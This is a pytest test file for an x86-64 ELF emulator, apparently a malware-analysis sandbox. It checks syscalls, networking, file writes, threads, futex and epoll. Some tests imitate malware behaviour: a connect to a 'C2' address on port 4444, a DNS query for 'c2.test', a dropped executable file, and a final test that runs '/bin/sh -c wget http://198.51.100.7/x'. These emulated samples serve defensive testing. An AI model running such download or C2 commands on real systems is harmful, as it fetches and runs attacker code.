import struct

import pytest

from elfsim_service.emulator import UnsupportedElf, emulate
from test.unit.elfbuilder import Prog
from test.unit.x64builder import RAX, X64Prog

C2_IP, C2_PORT = "198.51.100.7", 4444   # RFC 5737 documentation range


def _run(prog: X64Prog, **kw):
    return emulate(prog.build(), timeout_s=10, **kw)


def test_exit_code_is_reported_and_arch_is_x86_64():
    p = X64Prog()
    p.exit(7)
    r = _run(p)
    assert r.stop_reason == "exit(7)" and r.error is None and r.arch == "x86_64"


def test_execution_continues_after_the_syscall_instruction_and_stdout_is_captured():
    p = X64Prog()
    msg = p.d(b"hello")
    p.call("write", 1, msg, 5)
    p.call("write", 1, msg, 2)             # a second syscall proves execution resumed correctly
    p.exit(0)
    assert _run(p).stdout == b"hellohe"


def test_errors_are_64_bit_negative_errno_in_rax():
    p = X64Prog()
    slot = p.d(b"\0" * 8)
    p.sys(9999)                              # not a syscall -> ENOSYS
    p.store_rax(slot)
    p.call("write", 1, slot, 8)
    p.exit(0)
    (value,) = struct.unpack("<Q", _run(p).stdout)
    assert value == (-38) & 0xFFFFFFFFFFFFFFFF      # not truncated to 32 bits


def test_tcp_connect_is_recorded():
    p = X64Prog()
    addr = p.d(X64Prog.sockaddr_in(C2_IP, C2_PORT))
    p.call("socket", 2, 1, 0)                # AF_INET, SOCK_STREAM
    p.rdi_from_rax()
    p.mov(6, addr); p.mov(2, 16)             # rsi, rdx
    p.call_keep_args("connect")
    p.exit(0)
    r = _run(p)
    assert {"op": "connect", "proto": "tcp", "family": "inet", "ip": C2_IP, "port": C2_PORT} in r.network


def test_dns_query_uses_six_register_arguments_and_is_answered():
    query = (struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0)
             + b"\x02c2\x04test\x00" + struct.pack(">HH", 1, 1))
    p = X64Prog()
    dest = p.d(X64Prog.sockaddr_in("203.0.113.53", 53))
    q, buf = p.d(query), p.d(b"\0" * 128)
    p.call("socket", 2, 2, 0)                # SOCK_DGRAM
    p.rdi_from_rax()
    # sendto(fd, q, len, 0, dest, 16): flags in r10, dest in r8, addrlen in r9
    p.mov(6, q); p.mov(2, len(query)); p.mov(10, 0); p.mov(8, dest); p.mov(9, 16)
    p.call_keep_args("sendto")
    p.mov(6, buf); p.mov(2, 128); p.mov(10, 0); p.mov(8, 0); p.mov(9, 0)
    p.call_keep_args("recvfrom")             # rax = reply length
    p.rdx_from_rax()
    p.call("write", 1, buf)                  # rdx keeps the length
    p.exit(0)
    r = _run(p)
    assert any(n["op"] == "dns_query" and n["domain"] == "c2.test" for n in r.network)
    assert bytes([192, 0, 2, 53]) in r.stdout


def test_open_write_chmod_are_captured_in_memory():
    p = X64Prog()
    path, body = p.cstr("/tmp/dropped"), p.d(b"payload")
    p.call("open", path, 0o101)
    p.rdi_from_rax()
    p.mov(6, body); p.mov(2, 7)
    p.call_keep_args("write")
    p.call("chmod", path, 0o755)
    p.exit(0)
    r = _run(p)
    assert r.files == {"/tmp/dropped": b"payload"} and r.file_modes == {"/tmp/dropped": 0o755}


def test_fork_child_then_parent_and_execve_reads_8_byte_argv_pointers():
    p = X64Prog()
    sh, dashc, cmd = p.cstr("/bin/sh"), p.cstr("-c"), p.cstr("echo hi")
    argv = p.ptrs(sh, dashc, cmd, 0)
    parent = p.d(b"P")
    p.call("fork")
    p.jnz("parent")
    p.call("execve", sh, argv, 0)
    p.exit(1)
    p.label("parent")
    p.call("write", 1, parent, 1)
    p.exit(0)
    r = _run(p)
    execve = next(e for e in r.events if e["syscall"] == "execve")
    assert execve["argv"] == ["/bin/sh", "-c", "echo hi"]
    assert r.stdout == b"P" and r.stop_reason == "exit(0)"


def test_writev_reads_16_byte_iovecs():
    p = X64Prog()
    a, b = p.d(b"A"), p.d(b"B")
    iov = p.d(struct.pack("<QQQQ", a, 1, b, 1))
    p.call("writev", 1, iov, 2)
    p.exit(0)
    assert _run(p).stdout == b"AB"


def test_arch_prctl_sets_the_fs_base_so_tls_reads_work():
    p = X64Prog()
    tls, slot = p.d(struct.pack("<Q", 0x1122334455667788)), p.d(b"\0" * 8)
    p.call("arch_prctl", 0x1002, tls)        # ARCH_SET_FS
    p.load_fs0()                             # mov rax, fs:[0]
    p.store_rax(slot)
    p.call("write", 1, slot, 8)
    p.exit(0)
    assert struct.unpack("<Q", _run(p).stdout)[0] == 0x1122334455667788


def test_initial_stack_has_8_byte_argc_and_argv_pointers():
    p = X64Prog()
    slot = p.d(b"\0" * 8)
    p.load_stack_word(0)                     # argc
    p.store_rax(slot)
    p.call("write", 1, slot, 8)
    p.load_stack_word(16)                    # argv[1] (pointer at rsp+16)
    p.code += b"\x48\x89\xc6"                # mov rsi, rax
    p.mov(7, 1); p.mov(2, 1); p.mov(RAX, 1)  # write(1, argv[1], 1)
    p.code += b"\x0f\x05"
    p.exit(0)
    r = emulate(p.build(), argv=["/tmp/sample", "xyz"], timeout_s=10)
    assert struct.unpack("<Q", r.stdout[:8])[0] == 2 and r.stdout[8:] == b"x"


def test_uname_reports_x86_64():
    p = X64Prog()
    buf = p.d(b"\0" * 390)
    p.call("uname", buf)
    p.call("write", 1, buf + 65 * 4, 6)
    p.exit(0)
    assert _run(p).stdout == b"x86_64"


def test_select_takes_direct_register_arguments_on_x86_64():
    p = X64Prog()
    fdset, slot = p.d(struct.pack("<Q", 1)), p.d(b"\0" * 8)      # bit 0 = stdin
    tv = p.d(struct.pack("<QQ", 0, 1000))
    p.call("select", 1, fdset, 0, 0, tv)     # stdin is never readable -> 0 ready, bit cleared
    p.store_rax(slot)
    p.call("write", 1, slot, 8)
    p.call("write", 1, fdset, 8)
    p.exit(0)
    out = _run(p).stdout
    assert struct.unpack("<QQ", out) == (0, 0)


def test_infinite_loop_hits_the_instruction_limit():
    p = X64Prog()
    p.code += b"\xeb\xfe"
    assert emulate(p.build(), max_instructions=10_000, timeout_s=10).stop_reason == "instruction_limit"


def test_elf_class_must_match_the_architecture():
    p = X64Prog()
    p.exit(0)
    with pytest.raises(UnsupportedElf, match="expected 32-bit"):
        emulate(p.build(machine=8))                       # 64-bit ELF claiming MIPS
    with pytest.raises(UnsupportedElf, match="unsupported machine"):
        emulate(p.build(machine=183))                     # AArch64: not emulated
    q = Prog()
    q.exit(0)
    with pytest.raises(UnsupportedElf, match="expected 64-bit"):
        emulate(q.build(machine=62))                      # 32-bit ELF claiming x86-64


# ---- threads (cooperative scheduler) ------------------------------------------------------
THREAD_FLAGS = 0xD0F00        # CLONE_VM|FS|FILES|SIGHAND|THREAD|SYSVSEM|SETTLS, as the Go runtime passes


def _thread_stack(p: X64Prog) -> int:
    area = p.d(b"\0" * 4096)
    return area + 4096 - 64


def test_thread_handoff_through_futex_with_per_thread_tls():
    p = X64Prog()
    tls_a, tls_b = p.d(struct.pack("<Q", 0xAAAA)), p.d(struct.pack("<Q", 0xBBBB))
    flag, slot = p.d(struct.pack("<I", 0)), p.d(b"\0" * 8)
    msg_c, msg_m = p.d(b"C"), p.d(b"M")
    p.call("arch_prctl", 0x1002, tls_a)
    p.call("clone", THREAD_FLAGS, _thread_stack(p), 0, 0, tls_b)
    p.jnz("parent")
    p.call("write", 1, msg_c, 1)                       # ---- worker thread
    p.load_fs0(); p.store_rax(slot); p.call("write", 1, slot, 8)
    p.poke_byte(flag, 1)
    p.call("futex", flag, 1, 1)                        # FUTEX_WAKE one waiter
    p.call("exit", 0)                                  # thread exit, not exit_group
    p.label("parent")                                  # ---- main thread
    p.call("futex", flag, 0, 0, 0)                     # FUTEX_WAIT while *flag == 0
    p.call("write", 1, msg_m, 1)
    p.load_fs0(); p.store_rax(slot); p.call("write", 1, slot, 8)
    p.call("exit_group", 0)
    r = _run(p)
    assert r.stdout == b"C" + struct.pack("<Q", 0xBBBB) + b"M" + struct.pack("<Q", 0xAAAA)
    assert r.stop_reason == "exit(0)" and r.threads_created == 1


def test_all_threads_blocked_is_reported_as_a_deadlock():
    p = X64Prog()
    flag = p.d(struct.pack("<I", 0))
    p.call("clone", THREAD_FLAGS, _thread_stack(p), 0, 0, 0)
    p.jnz("parent")
    p.call("exit", 0)                                  # worker leaves without waking anyone
    p.label("parent")
    p.call("futex", flag, 0, 0, 0)                     # main waits forever
    p.exit(0)
    assert _run(p).stop_reason == "deadlock"


def test_sleeping_threads_wake_in_virtual_time_order():
    p = X64Prog()
    one, two = p.d(struct.pack("<QQ", 1, 0)), p.d(struct.pack("<QQ", 2, 0))
    msg_w, msg_m = p.d(b"W"), p.d(b"M")
    p.call("clone", THREAD_FLAGS, _thread_stack(p), 0, 0, 0)
    p.jnz("parent")
    p.call("nanosleep", one)                           # worker sleeps 1 s
    p.call("write", 1, msg_w, 1)
    p.call("exit", 0)
    p.label("parent")
    p.call("nanosleep", two)                           # main sleeps 2 s
    p.call("write", 1, msg_m, 1)
    p.call("exit_group", 0)
    r = _run(p)
    assert r.stdout == b"WM" and r.elapsed < 5         # ordered by the virtual clock, no real waiting


def test_a_spinning_thread_is_preempted_so_others_can_run():
    p = X64Prog()
    flag, msg = p.d(struct.pack("<I", 0)), p.d(b"D")
    p.call("clone", THREAD_FLAGS, _thread_stack(p), 0, 0, 0)
    p.jnz("parent")
    p.poke_byte(flag, 1)                               # worker just sets the flag
    p.call("exit", 0)
    p.label("parent")
    p.spin_until_nonzero(flag)                         # main busy-waits without any syscall
    p.call("write", 1, msg, 1)
    p.call("exit_group", 0)
    r = emulate(p.build(), max_instructions=20_000_000, timeout_s=20)
    assert r.stdout == b"D" and r.stop_reason == "exit(0)"


def test_futex_wait_with_a_timeout_on_a_single_thread_times_out():
    p = X64Prog()
    flag, ts, slot = p.d(struct.pack("<I", 0)), p.d(struct.pack("<QQ", 0, 1000)), p.d(b"\0" * 8)
    p.call("futex", flag, 0, 0, ts)
    p.store_rax(slot)
    p.call("write", 1, slot, 8)
    p.exit(0)
    assert struct.unpack("<q", _run(p).stdout)[0] == -110       # ETIMEDOUT


def test_futex_wait_returns_eagain_when_the_value_already_changed():
    p = X64Prog()
    flag, slot = p.d(struct.pack("<I", 5)), p.d(b"\0" * 8)
    p.call("futex", flag, 0, 0, 0)                     # expects 0 but the word holds 5
    p.store_rax(slot)
    p.call("write", 1, slot, 8)
    p.exit(0)
    assert struct.unpack("<q", _run(p).stdout)[0] == -11        # EAGAIN


def test_gettid_differs_per_thread():
    p = X64Prog()
    slot = p.d(b"\0" * 8)
    flag = p.d(struct.pack("<I", 0))
    p.call("clone", THREAD_FLAGS, _thread_stack(p), 0, 0, 0)
    p.jnz("parent")
    p.call("gettid"); p.store_rax(slot); p.call("write", 1, slot, 8)
    p.poke_byte(flag, 1); p.call("futex", flag, 1, 1); p.call("exit", 0)
    p.label("parent")
    p.call("futex", flag, 0, 0, 0)
    p.call("gettid"); p.store_rax(slot); p.call("write", 1, slot, 8)
    p.call("exit_group", 0)
    child, main = struct.unpack("<QQ", _run(p).stdout)
    assert child != main and {child, main} == {1000, 1001}


def test_forked_parent_receives_the_child_pid_and_the_fork_syscall_runs_once():
    p = X64Prog()
    slot = p.d(b"\0" * 8)
    p.call("fork")
    p.jnz("parent")
    p.exit(0)                                # child leaves at once
    p.label("parent")
    p.store_rax(slot)                        # what fork() returned to the parent
    p.call("write", 1, slot, 8)
    p.exit(0)
    r = _run(p)
    assert struct.unpack("<Q", r.stdout)[0] == 1001            # the child's pid, not -ENOSYS
    assert r.unknown_syscalls == {} and r.syscall_counts["fork"] == 1


# ---- epoll / eventfd ----------------------------------------------------------------------
EPOLLIN, EPOLLET = 1, 1 << 31


def _epoll_with_eventfd(p: X64Prog):
    """epoll fd 3 watching eventfd 4 (edge-triggered, user data 0xDEADBEEF). fds are allocated
    lowest-first, so the numbers are deterministic."""
    event = p.d(struct.pack("<IQ", EPOLLIN | EPOLLET, 0xDEADBEEF))
    p.call("epoll_create1", 0)
    p.call("eventfd2", 0, 0)
    p.call("epoll_ctl", 3, 1, 4, event)


def test_epoll_reports_a_readable_eventfd_once_when_edge_triggered():
    p = X64Prog()
    one, out, slot = p.d(struct.pack("<Q", 1)), p.d(b"\0" * 64), p.d(b"\0" * 8)
    _epoll_with_eventfd(p)
    p.call("write", 4, one, 8)                         # make the eventfd readable
    p.call("epoll_wait", 3, out, 8, 0)
    p.store_rax(slot); p.call("write", 1, slot, 8); p.call("write", 1, out, 12)
    p.call("epoll_wait", 3, out, 8, 0)                 # nothing new happened: edge already reported
    p.store_rax(slot); p.call("write", 1, slot, 8)
    p.exit(0)
    stdout = _run(p).stdout
    first_count, mask, data, second_count = (
        struct.unpack("<Q", stdout[:8])[0], *struct.unpack("<IQ", stdout[8:20]),
        struct.unpack("<Q", stdout[20:28])[0])
    assert (first_count, mask, data, second_count) == (1, EPOLLIN, 0xDEADBEEF, 0)


def test_thread_blocked_in_epoll_wait_is_woken_by_another_threads_eventfd_write():
    p = X64Prog()
    one, out, flag = p.d(struct.pack("<Q", 1)), p.d(b"\0" * 64), p.d(struct.pack("<I", 0))
    msg_w, msg_m = p.d(b"W"), p.d(b"M")
    _epoll_with_eventfd(p)
    p.call("clone", THREAD_FLAGS, _thread_stack(p), 0, 0, 0)
    p.jnz("main")
    p.call("epoll_wait", 3, out, 8, 0xFFFFFFFFFFFFFFFF)     # worker: timeout -1, blocks
    p.call("write", 1, msg_w, 1)
    p.poke_byte(flag, 1); p.call("futex", flag, 1, 1); p.call("exit", 0)
    p.label("main")
    p.call("sched_yield")                                   # let the worker start and block first
    p.call("write", 4, one, 8)                              # wakes the worker's epoll_wait
    p.call("futex", flag, 0, 0, 0)                          # wait for the worker to finish
    p.call("write", 1, msg_m, 1)
    p.call("exit_group", 0)
    r = _run(p)
    assert r.stdout == b"WM" and r.syscall_counts["epoll_wait"] == 2    # blocked, then re-run when woken
    assert r.stop_reason == "exit(0)"


def test_epoll_wait_with_nothing_to_wake_it_is_a_deadlock_not_a_spin():
    p = X64Prog()
    out = p.d(b"\0" * 64)
    _epoll_with_eventfd(p)
    p.call("clone", THREAD_FLAGS, _thread_stack(p), 0, 0, 0)
    p.jnz("main")
    p.call("epoll_wait", 3, out, 8, 0xFFFFFFFFFFFFFFFF)     # worker blocks forever
    p.call("exit", 0)
    p.label("main")
    p.call("epoll_wait", 3, out, 8, 0xFFFFFFFFFFFFFFFF)     # so does main
    p.exit(0)
    assert _run(p).stop_reason == "deadlock"



def test_vfork_style_clone_without_clone_thread_runs_the_child_then_the_parent():
    """posix_spawn()/system() use clone(CLONE_VM|CLONE_VFORK|SIGCHLD) on a separate child stack."""
    p = X64Prog()
    sh, dashc, cmd = p.cstr("/bin/sh"), p.cstr("-c"), p.cstr("wget http://198.51.100.7/x")
    argv, slot = p.ptrs(sh, dashc, cmd, 0), p.d(b"\0" * 8)
    p.call("clone", 0x4111, _thread_stack(p), 0, 0, 0)          # CLONE_VM | CLONE_VFORK | SIGCHLD
    p.jnz("parent")
    p.call("execve", sh, argv, 0)                                # child
    p.exit(1)
    p.label("parent")
    p.store_rax(slot)
    p.call("write", 1, slot, 8)
    p.exit(0)
    r = _run(p)
    execve = next(e for e in r.events if e["syscall"] == "execve")
    assert execve["argv"] == ["/bin/sh", "-c", "wget http://198.51.100.7/x"]
    assert struct.unpack("<Q", r.stdout)[0] == 1001 and r.stop_reason == "exit(0)"
